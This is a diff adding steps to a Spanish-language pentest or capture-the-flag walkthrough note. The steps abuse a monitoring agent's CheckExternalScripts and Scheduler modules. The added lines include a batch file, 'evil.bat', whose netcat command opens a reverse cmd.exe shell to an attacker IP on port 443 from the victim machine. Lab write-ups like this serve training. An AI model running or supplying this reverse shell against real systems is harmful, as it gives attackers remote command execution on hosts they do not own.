@@ -162,6 +162,16 @@ Ahora podemos acceder a la web a través del `https://localhost:8443/index.html`
 
 
 Ahora tendremos que acceder a la sección de *Modules* y en el habilitar el modulo *CheckExternalScripts* y *Scheduler*
+![[Pasted image 20260903103751.png]]
+![[Pasted image 20260903103806.png]]
+
+Ahora deberemos de descargar en la maquina victima en la ruta `C:\temp` los scripts `nc.exe` y `evil.bat` el cual debe de tener el siguiente contenido
+```shell
+@echo off
+C:\temp\nc.exe 10.10.14.226 443 -e cmd.exe
+```
+
+Este archivito se encarga de a través de [[NETCAT]] entablar una conexión  con nuestra maquina atacante
 
 
 
